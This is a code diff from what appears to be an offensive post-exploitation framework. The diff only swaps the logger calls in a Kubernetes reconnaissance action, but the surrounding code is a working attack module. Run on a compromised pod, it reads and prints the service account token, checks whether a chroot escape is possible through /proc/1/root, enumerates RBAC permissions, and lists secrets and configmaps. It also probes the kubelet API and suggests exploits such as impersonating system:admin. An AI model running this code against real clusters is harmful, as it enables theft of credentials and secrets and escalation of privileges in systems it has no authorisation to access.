@@ -1,6 +1,9 @@
 import json
 
+# External library imports
+from loguru import logger
 
+# Local application/library specific imports
 from toboggan.core.action import BaseAction
 from toboggan.utils.jwt import TokenReader
 
@@ -11,7 +14,7 @@ class KubeCheckAction(BaseAction):
     )
 
     def run(self) -> str:
-        self._logger.info("☁️ Kubernetes Environment Check")
+        logger.info("☁️ Kubernetes Environment Check")
 
         token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
         cert_path = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
@@ -19,38 +22,38 @@ class KubeCheckAction(BaseAction):
 
         token = self._executor.remote_execute(f"cat {token_path}").strip()
         if not token:
-            self._logger.warning("⚠️ No Kubernetes token found — likely not in a pod.")
+            logger.warning("⚠️ No Kubernetes token found — likely not in a pod.")
             return
 
-        self._logger.success(f"🔐 Found Kubernetes token: {token}")
+        logger.success(f"🔐 Found Kubernetes token: {token}")
 
         try:
             reader = TokenReader(token)
             api_server = reader.iss
             subject = reader.sub
-            self._logger.info(f"👤 Authenticated as: {subject}")
-            self._logger.info(f"🌍 Kubernetes API server: {api_server}")
+            logger.info(f"👤 Authenticated as: {subject}")
+            logger.info(f"🌍 Kubernetes API server: {api_server}")
         except Exception as exc:
-            self._logger.error(f"❌ Failed to parse the Kubernetes token: {exc}")
+            logger.error(f"❌ Failed to parse the Kubernetes token: {exc}")
             return
 
         # CA certificate check
         if not self._executor.remote_execute(f"cat {cert_path}"):
-            self._logger.warning("⚠️ No Kubernetes CA certificate found.")
+            logger.warning("⚠️ No Kubernetes CA certificate found.")
             return
-        self._logger.success(f"📜 Kubernetes CA certificate found: {cert_path}")
+        logger.success(f"📜 Kubernetes CA certificate found: {cert_path}")
 
         # Check if we are inside a container
         cgroup_info = self._executor.remote_execute("cat /proc/1/cgroup").strip()
-        self._logger.info(f"🔍 Cgroup info: {cgroup_info}")
+        logger.info(f"🔍 Cgroup info: {cgroup_info}")
 
         if cgroup_info.strip() == "0::/":
-            self._logger.info("🖥️ Likely running on host (not containerized).")
+            logger.info("🖥️ Likely running on host (not containerized).")
         else:
             if "kubepods" in cgroup_info:
-                self._logger.info("📦 Inside a Kubernetes pod.")
+                logger.info("📦 Inside a Kubernetes pod.")
             else:
-                self._logger.info("🔍 Uncertain container context.")
+                logger.info("🔍 Uncertain container context.")
 
             # Step 4: Attempt chroot escape detection
             etc_passwd = self._executor.remote_execute("cat /etc/passwd").strip()
@@ -59,11 +62,11 @@ class KubeCheckAction(BaseAction):
             ).strip()
 
             if etc_passwd != root_etc_passwd:
-                self._logger.success(
+                logger.success(
                     "🚪 Detected chroot escape possible — /proc/1/root/etc/passwd differs from guest."
                 )
             else:
-                self._logger.info(
+                logger.info(
                     "🔐 Same /etc/passwd inside and outside — likely no escape or already on host."
                 )
 
@@ -73,12 +76,10 @@ class KubeCheckAction(BaseAction):
         namespace = (
             self._executor.remote_execute(f"cat {namespace_path}").strip() or "default"
         )
-        self._logger.info(f"📛 Using namespace: {namespace}")
+        logger.info(f"📛 Using namespace: {namespace}")
 
         # SelfSubjectRulesReview (check what we can do)
-        self._logger.info(
-            "🔎 Enumerating allowed actions using SelfSubjectRulesReview (SSR)"
-        )
+        logger.info("🔎 Enumerating allowed actions using SelfSubjectRulesReview (SSR)")
         ssrr_payload = json.dumps({"spec": {"namespace": namespace}})
         ssrr_cmd = (
             f"{curl_base} -H 'Content-Type: application/json' "
@@ -94,13 +95,13 @@ class KubeCheckAction(BaseAction):
                 if r.get("resources")
             }
         except Exception:
-            self._logger.warning("⚠️ Could not parse SelfSubjectRulesReview.")
+            logger.warning("⚠️ Could not parse SelfSubjectRulesReview.")
             verbs = {}
 
         self._analyze_rules(ssrr_json)
 
         # Try to list pods
-        self._logger.info("📡 Trying to list pods via API")
+        logger.info("📡 Trying to list pods via API")
         pods_cmd = f"{curl_base} {api_server}/api/v1/pods"
         pods_raw = self._executor.remote_execute(pods_cmd, timeout=10)
         try:
@@ -110,34 +111,32 @@ class KubeCheckAction(BaseAction):
 
             if kind == "Status":
                 status = pods_json.get("status", "")
-                self._logger.info(
-                    f"Listing pods: '{status}' ({pods_json.get('reason')})"
-                )
+                logger.info(f"Listing pods: '{status}' ({pods_json.get('reason')})")
 
             elif kind == "PodList":
-                self._logger.success("✅ Successfully listed pods.")
+                logger.success("✅ Successfully listed pods.")
 
             else:
-                self._logger.warning("⚠️ Got response, but not PodList.")
+                logger.warning("⚠️ Got response, but not PodList.")
         except Exception:
-            self._logger.warning("🚫 Forbidden or no pods returned.")
+            logger.warning("🚫 Forbidden or no pods returned.")
 
         # If we can't list pods, try Secrets, ConfigMaps, etc.
         for resource in ["secrets", "configmaps", "serviceaccounts"]:
             if verbs.get(resource) and "list" in verbs[resource]:
-                self._logger.info(f"🔐 Trying to list {resource}")
+                logger.info(f"🔐 Trying to list {resource}")
                 list_cmd = (
                     f"{curl_base} {api_server}/api/v1/namespaces/default/{resource}"
                 )
                 output = self._executor.remote_execute(list_cmd)
                 try:
                     parsed = json.loads(output)
-                    self._logger.success(f"📦 Retrieved {resource}")
+                    logger.success(f"📦 Retrieved {resource}")
                     print(json.dumps(parsed, indent=4))
                 except Exception:
-                    self._logger.warning(f"⚠️ Failed to parse {resource} list response.")
+                    logger.warning(f"⚠️ Failed to parse {resource} list response.")
 
-        self._logger.info("📞 Probing kubelet (port 10250)")
+        logger.info("📞 Probing kubelet (port 10250)")
         node_ip = self._executor.remote_execute(
             "ip route get 1 | awk '{print $NF; exit}'"
         ).strip()
@@ -146,19 +145,19 @@ class KubeCheckAction(BaseAction):
             kubelet_cmd = f"curl -sk https://{node_ip}:10250/pods"
             result = self._executor.remote_execute(kubelet_cmd, timeout=5)
             if result:
-                self._logger.success(f"📡 Kubelet at {node_ip}:10250 responded.")
+                logger.success(f"📡 Kubelet at {node_ip}:10250 responded.")
                 try:
                     print(json.dumps(json.loads(result), indent=4))
                 except Exception:
                     print(result)
             else:
-                self._logger.warning("🚫 No response from kubelet.")
+                logger.warning("🚫 No response from kubelet.")
 
     def _analyze_rules(self, ssrr_json: dict) -> None:
         """
         Analyze SSR response and suggest actions based on privileges.
         """
-        self._logger.info("🧠 Analyzing allowed actions")
+        logger.info("🧠 Analyzing allowed actions")
 
         resource_suggestions = {
             "secrets": {
@@ -238,18 +237,16 @@ class KubeCheckAction(BaseAction):
                     desc = suggestion["desc"]
                     exploit = suggestion["exploit"]
                     verbs_str = ", ".join(verbs)
-                    self._logger.info(f"🔎 {res} — Verbs: [{verbs_str}] → {desc}")
-                    self._logger.info(f"    🧪 Try: {exploit}")
+                    logger.info(f"🔎 {res} — Verbs: [{verbs_str}] → {desc}")
+                    logger.info(f"    🧪 Try: {exploit}")
 
         # Impersonation
         for rule in rules:
             if "impersonate" in rule.get("verbs", []):
-                self._logger.warning(
+                logger.warning(
                     "🧙 Impersonation allowed — you can impersonate other users or serviceaccounts."
                 )
-                self._logger.info(
-                    "    🧪 Try: kubectl auth can-i --as system:admin '*' '*'"
-                )
+                logger.info("    🧪 Try: kubectl auth can-i --as system:admin '*' '*'")
 
         # Detect self-introspection only
         introspection_only = len(rules) == 2 and all(
@@ -263,10 +260,10 @@ class KubeCheckAction(BaseAction):
         )
 
         if not matched_resources and introspection_only:
-            self._logger.warning("🔐 This service account can only introspect itself.")
+            logger.warning("🔐 This service account can only introspect itself.")
 
         if not matched_resources and not introspection_only:
-            self._logger.warning("🔒 No actionable permissions detected.")
-            self._logger.info(
+            logger.warning("🔒 No actionable permissions detected.")
+            logger.info(
                 "🧪 Consider probing unauthenticated endpoints or kubelet APIs."
             )
